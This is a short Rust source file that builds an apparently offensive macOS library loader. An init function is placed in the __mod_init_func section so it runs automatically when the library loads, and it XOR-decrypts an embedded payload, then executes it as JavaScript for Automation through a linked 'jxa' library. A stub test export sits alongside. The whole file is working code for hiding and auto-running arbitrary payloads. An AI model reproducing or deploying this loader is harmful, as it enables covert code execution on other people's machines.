extern crate libc;

use libc::{c_char, c_void};
use std::ffi::CString;

pub static CODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/enc_payload"));
pub static KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/key"));


// https://github.com/codeSamuraii/PrettyBadPrivacy/blob/master/src/main.rs
fn xor_routine<'a>(val: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted_buffer: Vec<u8> = val.iter().zip(Vec::from(key).iter().cycle()).map(|(&x, &y)| x ^ y).collect();
    return encrypted_buffer;
}

#[link(name = "jxa")]
extern "C" {
    fn runjxa(code: *const libc::c_char) -> c_void;
}

#[used]
#[cfg_attr(target_os = "macos", link_section = "__DATA,__mod_init_func")]
pub static INITIALIZE: extern "C" fn() = init;
#[no_mangle]
pub extern "C" fn init() {
    // XOR Decrypt
    let unencrypted_payload = xor_routine(CODE, KEY);
    let code_string = std::str::from_utf8(&*unencrypted_payload).unwrap();
    let code_cstring = CString::new(code_string).expect("Couldn't create CString");
    // Execute the jxa code
    unsafe {
        runjxa(code_cstring.as_ptr());
    }
}


// Test export function
pub fn test_function() {}